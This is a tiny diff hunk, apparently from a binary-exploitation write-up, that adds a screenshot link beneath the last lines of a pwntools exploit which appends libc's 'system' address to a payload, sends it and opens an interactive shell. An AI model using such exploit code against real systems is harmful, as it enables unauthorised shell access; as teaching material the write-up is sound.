@@ -45,3 +45,4 @@ exploit += p64(libc.symbols['system'])
 p.sendline(exploit)
 p.interactive()
 ```
+![](shell_2.png)
